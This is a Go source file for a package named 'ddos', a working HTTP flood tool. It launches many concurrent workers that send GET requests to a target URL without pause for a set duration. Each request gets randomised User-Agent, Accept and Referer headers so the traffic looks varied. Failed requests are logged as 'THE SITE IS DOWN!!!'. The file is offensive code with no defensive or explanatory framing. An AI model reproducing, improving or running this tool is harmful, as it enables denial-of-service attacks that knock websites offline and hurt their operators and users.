package ddos

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"
)

func NewFlooder(url string, workerAmount uint16, duration uint32) Flooder {
	ddos := &flooder{
		url:          url,
		workerAmount: workerAmount,
		client:       http.DefaultClient,
		stopSignal:   make(chan bool),
		startSignal:  make(chan bool),
	}

	ddos.SetDuration(duration)
	return ddos
}

type Flooder interface {
	Flood()
	Stop()
	SetWorkerAmount(workers uint16)
	SetDuration(seconds uint32)
}

type flooder struct {
	url          string
	client       *http.Client
	workerAmount uint16
	stopSignal   chan bool
	startSignal  chan bool
	duration     time.Duration
	wg           sync.WaitGroup
	timer        *time.Timer
}

func (f *flooder) Flood() {
	for idx := uint16(0); idx < f.workerAmount; idx++ {
		time.Sleep(time.Microsecond * 100)
		f.wg.Add(1)
		go func() {
			defer f.wg.Done()
			f.flood()
		}()
		fmt.Printf("\rThreads [%.0f] are ready", float64(idx+1))
		os.Stdout.Sync()
	}

	fmt.Printf("\nPlease [Enter] for continue")
	_, err := bufio.NewReader(os.Stdin).ReadString('\n')
	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Println("Flood will end in " + f.duration.String() + " seconds.")
	close(f.startSignal)

	f.timer = time.NewTimer(f.duration)

	<-f.timer.C
	f.Stop()

	f.timer.Stop()
}

func (f *flooder) flood() {
	for {
		select {
		case <-f.stopSignal:
			return
		default:
			<-f.startSignal
			request := f.configRequest()

			resp, err := f.client.Do(request)
			if err == nil {
				_, copyErr := io.Copy(io.Discard, resp.Body)
				closeErr := resp.Body.Close()
				if copyErr != nil || closeErr != nil {
					log.Printf("Error occurred during response body copy or close: %v, %v", copyErr, closeErr)
				}
			} else {
				log.Printf("THE SITE IS DOWN!!!  --> ERROR MSG: %v\n", err)
			}
		}
		runtime.Gosched()
	}
}

func (f *flooder) configRequest() *http.Request {
	defaultRequest, err := http.NewRequest(http.MethodGet, f.url, nil)
	if err != nil {
		log.Fatal(err)
	}

	userAgent := getUserAgent()
	accept := acceptall[rand.Intn(len(acceptall))]
	referer := referers[rand.Intn(len(referers))]

	header := fmt.Sprintf("Connection: Keep-Alive\nCache-Control: max-age=0\nUser-Agent: %s\n%s\n%s", userAgent, accept, referer)

	f.splitHeader(header, defaultRequest)

	return defaultRequest
}

func (f *flooder) splitHeader(header string, request *http.Request) {
	pairs := strings.Split(header, "\n")

	for _, pair := range pairs {
		parts := strings.SplitN(pair, ": ", 2)
		if len(parts) == 2 {
			request.Header.Add(parts[0], parts[1])
		}
	}
}

func (f *flooder) Stop() {
	close(f.stopSignal)
	f.wg.Wait()
}

func (f *flooder) SetWorkerAmount(workers uint16) {
	f.workerAmount = workers
}

func (f *flooder) SetDuration(seconds uint32) {
	f.duration = time.Duration(seconds) * time.Second
}
